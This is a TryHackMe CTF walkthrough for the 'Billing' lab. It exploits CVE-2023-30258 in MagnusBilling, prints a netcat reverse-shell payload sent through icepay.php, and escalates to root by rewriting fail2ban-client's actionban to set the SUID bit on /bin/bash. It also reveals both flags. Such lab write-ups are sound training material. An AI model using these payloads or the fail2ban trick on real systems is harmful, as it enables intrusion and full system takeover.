## Billing - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/billing)

<i>Gain a shell, find the way and escalate your privileges!</i>

<i>Note: Bruteforcing is out of scope for this room.</i>

**IP: 10.10.15.55**
**Add it to /etc/hosts as billing.thm**<br>
**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation <br>

**Tools Used**: Nmap, Gobuster

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20CUT.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- As always first thing that I do is Nmap scan.
  ```
  nmap -sC -sV -T5 -p- 10.10.15.55 

  Nmap scan report for 10.10.15.55
  Host is up (0.050s latency).
  Not shown: 65531 closed tcp ports (reset)
  PORT     STATE SERVICE  VERSION
  22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
  | ssh-hostkey: 
  |   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
  |   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
  |_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
  80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
  | http-title:             MagnusBilling        
  |_Requested resource was http://10.10.15.55/mbilling/
  |_http-server-header: Apache/2.4.56 (Debian)
  | http-robots.txt: 1 disallowed entry 
  |_/mbilling/
  3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
  5038/tcp open  asterisk Asterisk Call Manager 2.10.6
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```
  
- While scanning I already checked billing.thm and got redirected to /mbillings, theres a login page so it can be useful! I also ran Gobuster to check for hidden assets.
  ```
  gobuster dir -u http://billing.thm/mbilling/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt ->

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /archive              (Status: 301) [Size: 321] [--> http://billing.thm/mbilling/archive/]
  /resources            (Status: 301) [Size: 323] [--> http://billing.thm/mbilling/resources/]
  /assets               (Status: 301) [Size: 320] [--> http://billing.thm/mbilling/assets/]
  /lib                  (Status: 301) [Size: 317] [--> http://billing.thm/mbilling/lib/]
  /LICENSE              (Status: 200) [Size: 7652]
  /tmp                  (Status: 301) [Size: 317] [--> http://billing.thm/mbilling/tmp/]
  /protected            (Status: 403) [Size: 276]
  Progress: 87664 / 87665 (100.00%)
  ===============================================================
  Finished
  ```
  
- Gobuster didn’t reveal much of use since I got redirect whatever I visited, even with robots.txt, but I got access to robots.txt with curl.
  ```
  curl http://billing.thm/robots.txt           

  User-agent: *
  Disallow: /mbilling/
  ```

- After that I started experimenting with SQLI and Burp but it wasnt successfull so I pivoted to researching known vulnerabilities.
  
---

## ⚙️ Shell Access

- So I started looking for exploits online and found this one; searchsploit gave me nothing, also theres one exploit in Metasploit!<br>
  [CVE-2023-30258 Exploit](https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit)

- This one is pretty straightforward, you start a listener and then run the exploit, all the details are written on creators GitHub.
  ```
  nc -lvnp 4444

  git clone https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit.git
  cd CVE-2023-30258-magnus-billing-v7-exploit
  python exploit.py -t <TARGET_IP> -a <ATTACKER_IP> -p <PORT>
  
  python exploit.py -t 10.10.15.55 -a [YOUR-THM-IP] -p 4444
  === Magnus Billing System v7 Exploit by Tinashe Matanda(SadNinja) ===
  Command Injection via icepay.php - Reverse Shell
  =======================================
  [+] Targeting: http://10.10.15.55/mbilling/lib/icepay/icepay.php
  [+] Attacker: [YOUR-THM-IP]:4444
  [+] Sending payload: ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [YOUR-THM-IP] 4444 >/tmp/f;
  [-] Error connecting to target: HTTPConnectionPool(host='10.10.15.55', port=80): Read timed out. (read timeout=5)
  
  nc -lvnp 4444                    
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.15.55] 43050
  sh: 0: can't access tty; job control turned off
  $ whoami
  asterisk
  ```
  
- LEGOOOOOOOOO! I got in, perfect, now hunting for flags is the last job.

---

## 🧍 User Privilege Escalation

- Alrighty, finding user flag is always pretty easy, so lets do it! Before hunting, I changed the shell to pty just so I can be more comfortable.
  ```
  python3 -c "import pty; pty.spawn('/bin/bash')"  

  $ python3 -c 'import pty;pty.spawn("/bin/bash");'
  asterisk@Billing:/var/www/html/mbilling/lib/icepay$
  ^Z
  zsh: suspended  nc -lvnp 4444
                                                                                                                       
  
  stty raw -echo;fg
  [2]  - continued  nc -lvnp 4444
                                 export TERM=xterm
  ```
  
- Now that I'm set up, finding user flag is pretty simple with `find` command.
  ```
  find /home -name user.txt 2>/dev/null
  /home/magnus/user.txt
  ```
  
- There it is, first flag done!
  ```
  cat /home/magnus/user.txt
  THM{4a6831d5f124b25eefb1e92e0f0da4ca}
  ```

---

## 👑 Root Privilege Escalation

- OK, so this part was really challenging for me, I tried various different things to get to root but couldnt do it. In the end, I did it, but honestly it took me approximately 2 hours to gain root privileges...
  
- I am not going to write here all the options that I tried that wasn't successfull, I'll only write the commands that gave me root access so here we go. Also, keep in mind that there are few options to exploit fail2ban and gain root!
  
- So I found `fail2ban` with `sudo -l` and I also tried to enumerate various different things in order to get root, but it was unsuccessfull.
  ```
  $ sudo -l
  Matching Defaults entries for asterisk on Billing:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
  
  Runas and Command-specific defaults for asterisk:
      Defaults!/usr/bin/fail2ban-client !requiretty
  
  User asterisk may run the following commands on Billing:
      (ALL) NOPASSWD: /usr/bin/fail2ban-client
  ```

- Now let's see what's actually there with `ls -al`
  ```
  ls -al /etc/fail2ban 
  total 84K
  drwxr-xr-x   6 root root 4.0K Mar 27  2024 .
  drwxr-xr-x 136 root root  12K May  1 11:51 ..
  drwxr-xr-x   2 root root 4.0K Mar 27  2024 action.d
  -rw-r--r--   1 root root 2.8K Nov 23  2020 fail2ban.conf
  drwxr-xr-x   2 root root 4.0K Jul 11  2021 fail2ban.d
  drwxr-xr-x   3 root root 4.0K Mar 27  2024 filter.d
  -rw-r--r--   1 root root  25K Nov 23  2020 jail.conf
  drwxr-xr-x   2 root root 4.0K Mar 27  2024 jail.d
  -rw-r--r--   1 root root 1.7K Mar 27  2024 jail.local
  -rw-r--r--   1 root root  645 Nov 23  2020 paths-arch.conf
  -rw-r--r--   1 root root 2.8K Nov 23  2020 paths-common.conf
  -rw-r--r--   1 root root  573 Nov 23  2020 paths-debian.conf
  -rw-r--r--   1 root root  738 Nov 23  2020 paths-opensuse.conf
  ```

- OK cool, this is where hell actually started for me, I'll put the link at the end that I was following to gain root access but couldn't do it that way. I'll also post some commands that I tried as well.

- So I check `fail2ban server status` and `jail configuration`.
  ```
  asterisk@Billing:/home/magnus$ sudo /usr/bin/fail2ban-client status
  Status
  |- Number of jail:      8
  `- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd

  cat /etc/fail2ban/jail.local
  [asterisk-iptables]
  enabled  = true
  filter   = asterisk
  action   = iptables-allports[name=ASTERISK, port=all, protocol=all]
  logpath  = /var/log/asterisk/messages
  maxretry = 5
  bantime = 600
  ```

- Now comes exploitation. First, retrieve the current set.
  ```
  asterisk@Billing:/home/magnus$ sudo /usr/bin/fail2ban-client get asterisk-iptables actions
  The jail asterisk-iptables has the following actions:
  iptables-allports-ASTERISK
  ```

- Next, modify the command for the `actionban` in the `iptables-allports-ASTERISK` action, which is executed when banning an IP for the asterisk-iptables jail.
  ```
  asterisk@Billing:/home/magnus$ sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
  <iptables> -I f2b-ASTERISK 1 -s <ip> -j <blocktype>
  
  asterisk@Billing:/home/magnus$ sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
  chmod +s /bin/bash
  
  asterisk@Billing:/home/magnus$ sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
  chmod +s /bin/bash
  
  asterisk@Billing:/home/magnus$ 
  ```

- Since it worked properly, let's manually ban random IP to check if it works, and if it does it should trigger the command execution..
  ```
  asterisk@Billing:/home/magnus$ ls -al /bin/bash
  -rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
  
  asterisk@Billing:/home/magnus$ sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
  1
  
  asterisk@Billing:/home/magnus$ ls -al /bin/bash
  -rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
  ```

- IT WORKED LEGOOOO!!! Now just execute `/bin/bash` with flag `-p` and get the flag!
  ```
  asterisk@Billing:/home/magnus$ /bin/bash -p
  bash-5.1# whoami
  root
  bash-5.1# cat /root/root.txt
  THM{33ad5b530e71a172648f424ec23fae60}
  bash-5.1# 
  ```

- I'm so glad it worked since I almost lost my mind during previous tries. Here's the [Fail2Ban LPE Guide](https://juggernaut-sec.com/fail2ban-lpe/) that I followed and some unsuccessfull commands.
  ```
  sudo /usr/bin/fail2ban-client ping; whoami
  sudo /usr/bin/fail2ban-client set sshd unbanip 127.0.0.1; /bin/bash -i
  sudo /usr/bin/fail2ban-client set sshd unbanip 127.0.0.1;echo x;id
  sudo /usr/bin/fail2ban-client set sshd unbanip 127.0.0.1 && /bin/bash
  sudo /usr/bin/fail2ban-client set sshd unbanip 127.0.0.1; bash
  sudo /usr/bin/fail2ban-client set sshd unbanip 127.0.0.1 && sudo /bin/bash
  ```
---

## 🏁 Flags

- **User Flag**: `THM{4a6831d5f124b25eefb1e92e0f0da4ca}`
- **Root Flag**: `THM{33ad5b530e71a172648f424ec23fae60}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Privilege escalation for sure, this was the hardest challenge so far that I did on THM.`

- What did I learn?
  `A new way of getting root access`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
